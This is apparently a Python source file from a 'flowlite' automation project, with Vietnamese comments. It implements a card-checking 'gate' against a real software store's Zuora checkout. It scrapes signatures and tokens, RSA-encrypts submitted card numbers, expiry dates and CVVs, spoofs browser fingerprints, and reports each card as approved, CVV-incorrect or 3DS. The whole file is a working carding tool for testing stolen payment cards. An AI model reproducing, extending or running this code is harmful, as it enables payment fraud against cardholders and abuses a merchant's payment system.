# flows/gate3.py
from __future__ import annotations
import os, uuid, hashlib, json

from flowlite import Flow, step, finalize, expect, http, js
from flowlite.plugins import CurlDump, MaskCookies

# ====== Cấu hình host (có thể override qua ENV) ======
BASE_STORE = os.environ.get("G3_STORE", "https://store.maltego.com")
BASE_ZUORA = os.environ.get("G3_ZUORA", "https://eu.zuora.com")
IPIFY     = os.environ.get("G3_IPIFY", "https://api.ipify.org/?format=json")

UA_FALLBACKS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/133 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/133 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
]

# ====== Khởi tạo flow ======
flow = Flow("gate3").debug(trace=True)
# nếu gọi qua FastAPI, loader đã flow.tls(...). Khi chạy thẳng, có thể set TLS_BASE & TOKEN ở ENV
if os.environ.get("TLS_BASE"):
    flow.tls(base=os.environ["TLS_BASE"], auth_header=os.environ.get("TLS_AUTH_HEADER","X-Auth-Token"))

# Bật plugin mask + dump cURL
LOG_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "logs", "curl"))
flow.use(MaskCookies)  # có thể thêm patterns để che PAN/CCV nếu muốn
flow.use(CurlDump, dir=LOG_DIR, include_response=True, max_body=4096, split_by_flow=True)

# ====== Helpers ======
def md5_hex(s: str) -> str:
    return hashlib.md5(str(s).encode("utf-8")).hexdigest()

def urlencode(s: str) -> str:
    return http.urlencode(s)

# ====== Các step ======

@step("init_input")
def init_input(ctx):
    d = ctx.data or {}
    # UA
    ctx.ua = d.get("ua") or UA_FALLBACKS[0]
    # Thẻ
    ctx.ccnum = str(d.get("CCNUM", "4242424242424242")).replace(" ", "")
    ctx.mm    = str(d.get("MM", "12"))
    ctx.yyyy  = str(d.get("YYYY", "2030"))
    ctx.ccv   = str(d.get("CCV", "123"))
    # Kiểm tra MM
    try:
        nmm = int(ctx.mm); expect.ge(nmm, 1); expect.ge(12, nmm)
    except Exception:
        raise AssertionError("MM invalid (1-12)")
    # accountid: nếu client không đưa thì md5(random)
    ctx.accountid = d.get("accountid") or md5_hex(str(uuid.uuid4()))
    # pageId/Maltego ID (nếu client cấp sẵn)
    ctx.page_id = d.get("pageId") or d.get("Maltegoid")

@step("get_ip")
def get_ip(ctx):
    r = (http.get(IPIFY)
           .accept("application/json")
           .accept_encoding("identity")
           .user_agent(ctx.ua)
           .label("ipify")
           .via_requests(no_proxy=True)
           .send())
    ctx.ip = r.json().get("ip")
    expect.truthy(ctx.ip, "cannot fetch public IP")

@step("rsa_signatures")
def rsa_signatures(ctx):
    """
    POST /api/checkout/rsa-signatures để lấy signature/token/key/tenantId
    Body JSON (text) theo kịch bản gốc: {"method":"POST","pageId":ctx.page_id,"uri": BASE_ZUORA + /apps/PublicHostedPageLite.do}
    """
    # nếu không có pageId từ data, step này vẫn có thể trả (tuỳ backend store). Nhưng tốt nhất nên cấp pageId.
    body = {"method": "POST", "pageId": ctx.page_id, "uri": f"{BASE_ZUORA}/apps/PublicHostedPageLite.do"}
    r = (http.post(f"{BASE_STORE}/api/checkout/rsa-signatures")
           .content_type("text/plain;charset=UTF-8")
           .accept("*/*")
           .user_agent(ctx.ua)
           .referer(f"{BASE_STORE}/checkout/payment-method")
           .body_text(json.dumps(body))
           .label("rsa-signatures")
           .via_tls()
           .send())
    t = r.text()
    # trích xuất
    ctx.signature = http.re(r'"signature"\s*:\s*"([^"]+)"', t, 1)
    ctx.token     = http.re(r'"token"\s*:\s*"([^"]+)"', t, 1)
    ctx.key       = http.re(r'"key"\s*:\s*"([^"]+)"', t, 1)
    ctx.tenantId  = http.re(r'"tenantId"\s*:\s*"([^"]+)"', t, 1)
    expect.truthy(ctx.signature and ctx.token and ctx.tenantId, "rsa-signatures missing fields")

@step("get_phpl")
def get_phpl(ctx):
    """
    Gọi requestPage để lấy field_key/signatureh/tokenpay/id/xjd28s_6sk
    """
    sig_enc = urlencode(ctx.signature)
    host_enc = urlencode(f"{BASE_STORE}/checkout/payment-method")
    url = (f"{BASE_ZUORA}/apps/PublicHostedPageLite.do"
           f"?method=requestPage&host={host_enc}"
           f"&fromHostedPage=true&jsVersion=1.3.1"
           f"&field_accountId={ctx.accountid}"
           f"&id={ctx.page_id or ''}"
           f"&signature={sig_enc}"
           f"&style=inline&submitEnabled=false"
           f"&tenantId={ctx.tenantId}"
           f"&token={ctx.token}"
           f"&billingEntity=Maltego%20Inc.&zlog_level=warn")
    r = (http.get(url)
           .accept("*/*")
           .accept_encoding("identity")
           .referer(f"{BASE_STORE}/checkout/payment-method")
           .user_agent(ctx.ua)
           .label("phpl-requestPage")
           .via_tls()
           .send())
    html = r.text()
    ctx.signatureh = http.re(r'id="signature"\s+value="([^"]+)"', html, 1)
    ctx.field_key  = http.re(r'"field_key"\s+value="([^"]+)"', html, 1)
    ctx.tokenpay   = http.re(r'id="token"\s+value="([^"]+)"', html, 1)
    ctx.id         = http.re(r'id="id"\s+value="([^"]+)"', html, 1)
    ctx.xjd28s_6sk = http.re(r'xjd28s_6sk"\s+value="([^"]+)"', html, 1) or ""
    expect.ge(len(ctx.field_key or ""), 100, "field_key too short")
    expect.truthy(ctx.id and ctx.tokenpay, "missing id/tokenpay")

@step("encrypt")
def encrypt(ctx):
    """
    Gọi plugin Node để mã hoá RSA (PKCS#1 v1.5). Plugin của anh hỗ trợ:
      - Trả text: only='encrypted_values'
      - Trả JSON: { encrypt_result: { encrypted_values, ... } }
    Ở đây dùng JSON đầy đủ để dễ debug.
    """
    pem = js.to_pem_public_key(ctx.field_key)
    out = js.run("js/hpm_encrypt_official.js", {
        "field_key": pem,
        "CCNUM": ctx.ccnum,
        "MM": ctx.mm,
        "YYYY": ctx.yyyy,
        "CCV": ctx.ccv,
        "IP": ctx.ip
    }, expect="auto")
    if isinstance(out, str):
        ctx.encrypted_values = out
    else:
        # plugin gốc của anh in {"encrypted_fields","encrypted_values"} hoặc {"encrypt_result":{...}}
        ctx.encrypted_values = (
            (out.get("encrypt_result") or {}).get("encrypted_values")
            or out.get("encrypted_values")
        )
    expect.truthy(ctx.encrypted_values, "encrypt failed: no encrypted_values")

@step("submit_phpl")
def submit_phpl(ctx):
    """
    Submit form tới Zuora HPM.
    """
    sig_final = ctx.signatureh or ctx.signature
    body = {
        "method": "submitPage",
        "id": ctx.id,
        "tenantId": ctx.tenantId,
        "token": ctx.tokenpay,
        "signature": urlencode(sig_final),
        "field_key": urlencode(ctx.field_key),
        "field_style": "inline",
        "jsVersion": "1.3.1",
        "field_submitEnabled": "false",
        "host": urlencode(f"{BASE_STORE}/checkout/payment-method"),
        "encrypted_fields": "%23field_creditCardNumber%23field_cardSecurityCode%23field_creditCardExpirationMonth%23field_creditCardExpirationYear",
        "encrypted_values": urlencode(ctx.encrypted_values),
        "fromHostedPage": "true",
        "xjd28s_6sk": ctx.xjd28s_6sk,
        "field_accountId": ctx.accountid,
    }
    r = (http.post(f"{BASE_ZUORA}/apps/PublicHostedPageLite.do")
           .content_type("application/x-www-form-urlencoded; charset=UTF-8")
           .referer(f"{BASE_ZUORA}/apps/")
           .user_agent(ctx.ua)
           .form(body)
           .label("phpl-submit")
           .via_tls()
           .send())
    t = r.text()
    ctx.approved      = ("AuthorizeResult\":\"Approved\"" in t)
    ctx.cvv_incorrect = ("security code is incorrect" in t) or ("CVV" in t and "incorrect" in t)
    ctx.three_ds      = ("ThreeDs2" in t) or ("threeDs2" in t) or ("3DS" in t)

@finalize
def done(ctx):
    status = "APPROVED" if ctx.approved else ("CVV_INCORRECT" if ctx.cvv_incorrect else ("3DS" if ctx.three_ds else "UNKNOWN"))
    return {
        "status": status,
        "uuid": str(uuid.uuid4())[:8],
        "ip": ctx.ip,
        "accountid": ctx.accountid,
        "id": ctx.id,
        "tenantId": ctx.tenantId,
        "tokenpay": ctx.tokenpay,
        "field_key_len": len(ctx.field_key or ""),
        "enc_len": len(ctx.encrypted_values or ""),
        "http_traces": len((ctx.meta.get("http_trace") or [])),
        "task_traces": len((ctx.meta.get("task_trace") or [])),
        # (tuỳ chọn) trả thêm để debug
        # "trace": ctx.meta.get("http_trace"),
    }

# Đăng ký step trong module
flow.register(globals())

# Cho phép chạy trực tiếp để test (không qua FastAPI)
if __name__ == "__main__":
    import json
    TLS_TOKEN = os.environ.get("TLS_TOKEN")  # nếu via_tls
    # dữ liệu test (đừng dùng thẻ thật)
    data = {"CCNUM":"4242424242424242","MM":"12","YYYY":"2030","CCV":"123"}
    out = flow.run(data=data, session={"profile":"chrome_133"}, options={"httpVersion":"h2"}, tls_auth_token=TLS_TOKEN)
    print(json.dumps(out, ensure_ascii=False, indent=2))
